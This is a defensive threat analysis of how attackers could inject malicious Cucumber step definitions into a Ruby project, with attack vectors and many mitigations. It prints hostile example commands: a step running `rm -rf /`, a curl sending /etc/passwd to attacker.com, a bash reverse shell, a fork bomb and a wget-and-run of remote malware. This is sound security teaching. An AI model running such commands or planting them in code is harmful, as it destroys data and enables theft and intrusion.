## Deep Analysis of Attack Tree Path: Inject Malicious Step Definitions

This analysis delves into the specific attack path: **Inject Malicious Step Definitions**, focusing on its implications for a Ruby application utilizing the `cucumber-ruby` gem. We will break down each node, analyze potential attack vectors, assess the risks, and recommend mitigation strategies.

**ATTACK TREE PATH:**

**Inject Malicious Step Definitions [HIGH RISK PATH]**

*   **Gain Write Access to Step Definition File Location [CRITICAL NODE]**
    *   **Malicious Step Definition Executes Arbitrary Code [CRITICAL NODE] [HIGH RISK PATH]**
        *   **Directly Execute System Commands [CRITICAL NODE]**

**Understanding the Context: Cucumber and Step Definitions**

Cucumber is a Behavior-Driven Development (BDD) tool that allows writing executable specifications in plain text, often called "features". These features are then linked to code through "step definitions". Step definitions are Ruby code blocks that are executed when a corresponding step in a feature file is encountered. `cucumber-ruby` is the Ruby implementation of Cucumber.

Step definitions are typically stored in `.rb` files within a designated directory structure (often `features/step_definitions`). When Cucumber runs, it loads these files and uses regular expressions to match steps in the feature files to the defined code blocks.

**Deep Dive into Each Node:**

**1. Inject Malicious Step Definitions [HIGH RISK PATH]**

* **Description:** This is the overarching goal of the attacker. The attacker aims to introduce malicious code into the step definition files used by the Cucumber application. Success here grants the attacker significant control over the application's execution environment.
* **Risk Assessment:** This is a **HIGH RISK PATH** because successful injection allows for arbitrary code execution within the application's context. This can lead to complete compromise of the application, data breaches, and denial of service.
* **Potential Attack Vectors:**
    * **Compromised Developer Machine:** If a developer's machine is compromised, attackers can directly modify the step definition files in the project repository.
    * **Vulnerable Version Control System (VCS):**  Weak authentication or authorization on the VCS (e.g., Git) could allow unauthorized users to push malicious changes.
    * **Compromised CI/CD Pipeline:** If the CI/CD pipeline lacks proper security controls, attackers might inject malicious code during the build or deployment process.
    * **Supply Chain Attack:**  If a dependency or a tool used in the development process is compromised, it could be used to inject malicious step definitions.
    * **Exploiting Web Server Vulnerabilities (Less Likely, but Possible):** In scenarios where step definition files are served or managed through a web interface (though not typical for Cucumber), vulnerabilities in that interface could be exploited.
* **Impact:**
    * Arbitrary code execution on the server.
    * Data exfiltration or manipulation.
    * Service disruption or denial of service.
    * Privilege escalation.
    * Introduction of backdoors for persistent access.

**2. Gain Write Access to Step Definition File Location [CRITICAL NODE]**

* **Description:** This node represents the prerequisite for injecting malicious step definitions. The attacker needs the ability to modify the files where step definitions are stored.
* **Risk Assessment:** This is a **CRITICAL NODE** because without write access, the attacker cannot directly inject malicious code.
* **Detailed Analysis of Potential Scenarios:**
    * **Direct File System Access:**
        * **Compromised Credentials:** Obtaining credentials for a user with write access to the file system where step definitions reside.
        * **Exploiting File System Permissions:**  Finding vulnerabilities in file system permissions that allow unauthorized modification.
        * **Accessing Shared Network Drives:** If step definitions are stored on a shared network drive with weak access controls.
    * **Through Version Control System (VCS):**
        * **Compromised VCS Credentials:** Obtaining credentials for a user with write access to the repository.
        * **Exploiting VCS Vulnerabilities:**  Leveraging vulnerabilities in the VCS software itself.
        * **Social Engineering:** Tricking developers into merging malicious pull requests.
    * **Through CI/CD Pipeline:**
        * **Compromised CI/CD Credentials:** Obtaining credentials for the CI/CD system.
        * **Exploiting CI/CD Vulnerabilities:**  Leveraging vulnerabilities in the CI/CD platform.
        * **Malicious Scripts in CI/CD Configuration:** Injecting malicious scripts into the CI/CD configuration that modify step definitions during the build process.
    * **Through Development Environment:**
        * **Compromised Developer Machine:** As mentioned earlier, a compromised developer machine provides direct access to the files.
        * **Malicious Browser Extensions or IDE Plugins:**  Compromised or malicious extensions/plugins used by developers could modify files.

**3. Malicious Step Definition Executes Arbitrary Code [CRITICAL NODE] [HIGH RISK PATH]**

* **Description:** Once write access is gained and malicious code is injected into a step definition, this node represents the execution of that code by the Cucumber runner.
* **Risk Assessment:** This is a **CRITICAL NODE** and a **HIGH RISK PATH** because it signifies the point where the attacker's malicious payload is activated. The impact is immediate and potentially severe.
* **How Malicious Code Can Be Injected:**
    * **Directly Embedding Malicious Ruby Code:**  The attacker can insert Ruby code directly into a step definition that performs malicious actions.
    * **Requiring External Malicious Files:** The attacker could modify a step definition to `require` a malicious Ruby file located elsewhere (if they can also place that file).
    * **Using System Calls within Step Definitions:** Step definitions can execute system commands using methods like `system()`, backticks (` `` `), or `IO.popen()`. This is the pathway to the next node.
* **Example of a Malicious Step Definition:**

```ruby
Given /a malicious step/ do
  `rm -rf /` # VERY DANGEROUS - DO NOT RUN
end
```

* **Context of Execution:**  The malicious code executes with the same privileges as the Cucumber process, which is typically the application's user.

**4. Directly Execute System Commands [CRITICAL NODE]**

* **Description:** This is a specific type of arbitrary code execution where the malicious step definition directly invokes operating system commands.
* **Risk Assessment:** This is a **CRITICAL NODE** as it provides a direct and powerful way for the attacker to interact with the underlying operating system.
* **Examples of Malicious System Commands:**
    * **Data Exfiltration:** `curl -X POST -d "$(cat /etc/passwd)" https://attacker.com/steal`
    * **Creating Backdoors:** `echo "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1" > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh`
    * **Denial of Service:** `forkbomb() { forkbomb | forkbomb & }; forkbomb`
    * **Modifying System Files:** `echo "malicious entry" >> /etc/hosts`
    * **Installing Malware:** `wget http://attacker.com/malware.sh && bash malware.sh`
* **Impact:** The impact is highly dependent on the specific commands executed but can range from minor disruptions to complete system compromise.

**Overall Risk Assessment:**

This attack path represents a significant security risk for applications using `cucumber-ruby`. The ability to inject malicious step definitions grants attackers a powerful foothold within the application's execution environment. The consequences can be severe, potentially leading to data breaches, service disruption, and complete system compromise.

**Mitigation Strategies:**

To protect against this attack path, a multi-layered approach is necessary:

**Prevention:**

* **Strong Access Controls:**
    * **Restrict Write Access:**  Limit write access to the step definition directory and files to only authorized personnel and processes.
    * **Role-Based Access Control (RBAC):** Implement RBAC on the file system and version control system.
    * **Principle of Least Privilege:** Grant only the necessary permissions to users and processes.
* **Secure Version Control Practices:**
    * **Strong Authentication and Authorization:** Enforce strong passwords, multi-factor authentication (MFA), and robust authorization mechanisms for the VCS.
    * **Code Reviews:** Implement mandatory code reviews for all changes to step definition files.
    * **Branch Protection:** Utilize branch protection rules to prevent direct pushes to critical branches and require pull requests.
    * **Signed Commits:**  Encourage or enforce the use of signed commits to verify the identity of committers.
* **Secure CI/CD Pipeline:**
    * **Secure Credentials Management:** Store CI/CD credentials securely (e.g., using secrets management tools).
    * **Principle of Least Privilege for CI/CD:** Grant the CI/CD pipeline only the necessary permissions.
    * **Input Validation for CI/CD Configuration:**  Sanitize and validate any external inputs used in CI/CD configurations.
    * **Regular Audits of CI/CD Configurations:** Review the CI/CD pipeline configuration for potential vulnerabilities.
* **Secure Development Practices:**
    * **Secure Coding Training:** Educate developers on secure coding practices, including the risks of arbitrary code execution.
    * **Dependency Management:**  Regularly audit and update dependencies to patch known vulnerabilities. Use dependency scanning tools.
    * **Input Sanitization:** While step definitions primarily interact with internal application logic, be mindful of any external data they might process.
* **Host-Level Security:**
    * **Regular Security Updates:** Keep the operating system and all software up-to-date with security patches.
    * **Intrusion Detection/Prevention Systems (IDS/IPS):** Implement IDS/IPS to detect and potentially block malicious activity.
    * **File Integrity Monitoring (FIM):** Use FIM tools to monitor changes to critical files, including step definition files.

**Detection and Monitoring:**

* **VCS Activity Monitoring:** Monitor the VCS for unauthorized changes to step definition files.
* **CI/CD Pipeline Monitoring:** Monitor the CI/CD pipeline for unexpected modifications or execution of suspicious scripts.
* **Runtime Monitoring:** Monitor the application's behavior for unusual activity that might indicate the execution of malicious step definitions (e.g., unexpected network connections, file system modifications, high CPU/memory usage).
* **Security Information and Event Management (SIEM):**  Collect and analyze logs from various sources (application logs, system logs, VCS logs) to detect suspicious patterns.

**Developer Recommendations:**

* **Treat Step Definition Files as Critical Infrastructure:**  Recognize the security sensitivity of step definition files and implement appropriate controls.
* **Minimize the Use of System Calls in Step Definitions:**  Avoid using system calls within step definitions unless absolutely necessary and with extreme caution. If system calls are required, carefully sanitize any inputs.
* **Implement a Robust Code Review Process:** Ensure that all changes to step definition files are thoroughly reviewed by multiple developers.
* **Regularly Audit Step Definition Files:** Periodically review step definition files for any unexpected or suspicious code.
* **Use Static Analysis Tools:** Employ static analysis tools that can scan Ruby code for potential security vulnerabilities.

**Conclusion:**

The "Inject Malicious Step Definitions" attack path poses a significant threat to applications using `cucumber-ruby`. By gaining write access to step definition files, attackers can inject arbitrary code that executes within the application's context, potentially leading to severe consequences. Implementing a comprehensive security strategy encompassing strong access controls, secure development practices, and robust monitoring is crucial to mitigate this risk. The development team must be acutely aware of the potential dangers and treat step definition files with the same level of security as critical application code.
